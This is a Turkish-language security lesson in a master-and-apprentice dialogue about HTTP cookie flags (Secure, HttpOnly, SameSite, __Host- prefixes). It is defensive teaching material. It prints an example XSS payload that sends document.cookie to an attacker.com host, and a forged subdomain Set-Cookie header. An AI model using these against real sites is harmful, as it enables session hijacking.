# Hafta 23 / Gün 157: HTTP Cookies ve Güvenlik Bayrakları

## Usta-Çırak / Hoca Dersi Notları

> **Usta:** *"Evladım, web protokolü (HTTP) doğası gereği durumsuzdur (stateless). Yani sunucu, bir önceki istekte senin kim olduğunu hatırlamaz. Durumu korumak için icat edilen en eski ve en kritik mekanizma ise HTTP Çerezleridir (Cookies). Bir kullanıcının kimlik kartı, kasasının anahtarı o küçük çerezde saklanır. Eğer bir mühendis o çereze 'Secure', 'HttpOnly' ve 'SameSite' bayraklarını takmayı unutursa, anahtarı sokak kapısının üzerinde bırakmış sayılır."*
>
> **Çırak:** *"Ustamm, modern web uygulamalarında JWT ve LocalStorage gibi yeni depolama alanları varken neden hâlâ çerezlerin peşindeyiz? Çerez bayrakları bizi tam olarak hangi saldırılardan korur?"*
>
> **Usta:** *"Bak evlat, LocalStorage'a oturum belirteci (token) koymak cehaletin zirvesidir! LocalStorage'daki her şeye sayfadaki herhangi bir JavaScript kodu erişebilir. Bir XSS açığı çıktığı an saldırgan `localStorage.getItem('token')` der ve kullanıcının ruhunu teslim alır. Oysa doğru yapılandırılmış bir HTTP çerezi (`HttpOnly`, `Secure`, `SameSite=Strict`, `__Host-` önekli), XSS olsa dahi tarayıcı tarafından korunur; JavaScript o çerezi okuyamaz. Bugün seninle çerez güvenliğinin anatomisini en ince ayrıntısına kadar öğreneceğiz."*

---

## 1. HTTP Çerezlerinin Anatomisi ve Güvenlik Bayrakları

Bir web sunucusu, istemcinin tarayıcısına çerez bırakmak için `Set-Cookie` yanıt başlığını kullanır:
```http
Set-Cookie: __Host-session=a1b2c3d4e5; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=86400
```

Bu başlığın içindeki her bir güvenlik parametresi farklı bir saldırı vektörünü bertaraf eder:

```
+-------------------+-------------------------------------------------------------------------------+
| Güvenlik Bayrağı  | Savunduğu Saldırı Vektörü & Teknik İşlevi                                     |
+-------------------+-------------------------------------------------------------------------------+
| Secure            | MITM / Düz Metin Dinleme: Çerezin yalnızca TLS 1.3 şifreli kanaldan iletimi.   |
| HttpOnly          | XSS Session Hijacking: JavaScript (document.cookie) okumasını tamamen yasaklar.|
| SameSite=Strict   | CSRF (Cross-Site Request Forgery): Çerez üçüncü taraf isteklerinde taşınmaz.  |
| SameSite=Lax      | CSRF & Kullanılabilirlik: Güvenli üst düzey GET yönlendirmelerinde izin verir.|
| SameSite=None     | Çapraz site entegrasyonu (iFrame/Widget): Kesinlikle Secure bayrağı zorunludur.|
| __Host- Öneki     | Alt Alan Adı Sabitleme (Subdomain Fixation): Path=/ olmalı, Domain OLMAMALIDIR.|
| __Secure- Öneki   | Şifresiz İletim Engeli: Mutlaka Secure bayrağı taşımalıdır.                   |
+-------------------+-------------------------------------------------------------------------------+
```

---

## 2. Derinlemesine Güvenlik Parametreleri ve Saldırı Senaryoları

### 1. `Secure` Bayrağı (Şifreli İletim Garantisi)
- **Problem:** Kullanıcı HTTPS üzerinden oturum açmış olsa bile, ağdaki bir saldırgan (kahvehanedeki sahte Wi-Fi / ARP Spoofing) tarayıcıyı gizlice `http://banka.com/logo.png` adresine istek yapmaya zorlayabilir (SSL Stripping). Eğer çerezde `Secure` yoksa, tarayıcı oturum çerezini açık HTTP üzerinden gönderir ve saldırgan dinler.
- **Savunma:** Çereze `Secure` eklendiğinde, tarayıcı çerezi **asla ve hiçbir koşulda** şifresiz HTTP bağlantısında göndermez.

### 2. `HttpOnly` Bayrağı (XSS Oturum Çalınma Kalkanı)
- **Problem:** Sayfada en ufak bir XSS açığı (örneğin arama kutusuna yazılan `<script>` tag'i) oluştuğunda, saldırganın ilk yaptığı iş `new Image().src = "http://attacker.com/steal?c=" + document.cookie;` kodunu çalıştırmaktır.
- **Savunma:** Çerezde `HttpOnly` bayrağı varsa, tarayıcı JavaScript motoru `document.cookie` nesnesinde o çerezi gizler. Betik çerezi göremez, kopyalayamaz, harici sunucuya aktaramaz. Oturum hırsızlığı engellenir.

### 3. `SameSite` Politikası (Siteler Arası İstek Sahteciliği / CSRF Kalkanı)
Tarayıcılar tarihsel olarak, kullanıcı `kotusite.com` üzerinde gezinirken arka planda `banka.com/transfer` adresine bir istek yapıldığında, `banka.com`'a ait tüm çerezleri otomatik eklerdi. Bu zaafın adı **CSRF**'tir.
- **`SameSite=Strict`:** En güvenli moddur. İstek üçüncü bir siteden geliyorsa (hatta harici bir e-postadaki linke tıklanarak gelse bile) çerez **asla eklenmez**.
- **`SameSite=Lax`:** Modern tarayıcıların varsayılanıdır. Durum değiştiren (POST, PUT, DELETE) çapraz site isteklerinde çerez engellenir; ancak kullanıcı harici bir linke tıklayıp siteye ilk girdiğinde (Top-level GET navigation) çerez gönderilir, böylece kullanıcı oturumu açık kalır.
- **`SameSite=None; Secure`:** iFrame veya üçüncü taraf entegrasyonlar için kullanılır. `Secure` olmadan kullanılırsa tarayıcı tarafından **doğrudan reddedilir**.

### 4. RFC 6265bis Çerez Önekleri: `__Host-` ve `__Secure-`
Geleneksel çerez mekanizmasında büyük bir mimari açık vardır: **Alt Alan Adı Manipülasyonu (Subdomain Cookie Injection/Fixation).**
Örneğin `blog.banka.com` üzerinde bir XSS açığı veya alt alan devralma (Subdomain Takeover) varsa, o alt alan `Set-Cookie: session=attacker_token; Domain=banka.com` başlığı atarak ana `banka.com` sitesinin çerezini ezebilir!

Bu felaketi önlemek için RFC 6265bis iki özel önek getirmiştir:
1. **`__Secure-` Öneki:**
   - Adı `__Secure-` ile başlayan çerezler yalnızca HTTPS üzerinden kabul edilir ve `Secure` bayrağı taşımak zorundadır.
2. **`__Host-` Öneki (Kusursuz İzolasyon):**
   - Yalnızca HTTPS üzerinden iletilir (`Secure`).
   - `Path=/` (kök dizin) olmak zorundadır.
   - **En kritik kural: Kesinlikle `Domain` özniteliği İÇERMEMELİDİR (Host-only cookie).**
   - Sonuç: Hiçbir alt alan adı (subdomain) bu çerezi ezemez, okuyamaz veya değiştiremez.

---

## 3. Kurumsal Çerez Sertleştirme Motoru

Geliştirdiğimiz `CookieSecurityEngine`, kurumsal Set-Cookie başlıklarını şu standartlara göre otomatik denetler:
- Oturum çerezinde eksik `Secure` (-40 puan, KRİTİK).
- Oturum çerezinde eksik `HttpOnly` (-35 puan, YÜKSEK).
- Eksik `SameSite` (-25 puan, YÜKSEK).
- `SameSite=None` iken `Secure` olmaması (-40 puan, KRİTİK).
- Hatalı `__Host-` kullanımı (Domain belirtilmişse veya Path kök değilse -30 puan).
- Wildcard veya nokta ile başlayan geniş domain (`.company.com` -25 puan).
- 14 günü aşan aşırı oturum çerez ömrü (-15 puan).
- Çerez içinde düz metin `role=admin` veya parola tespiti (-30 puan).

---

## Özet ve Ustanın Altın Kuralı

> *"Evladım, oturum çerezi üretirken standart şablonun şu olmalıdır: `__Host-session_id=<kriptografik_rastgele_uuid>; Path=/; Secure; HttpOnly; SameSite=Strict`. Bu altın kuralı uyguladığında XSS oturum hırsızlığını, CSRF'i, MITM dinlemelerini ve alt alan manipülasyonlarını aynı anda tek bir başlıkla tarihe gömersin!"*
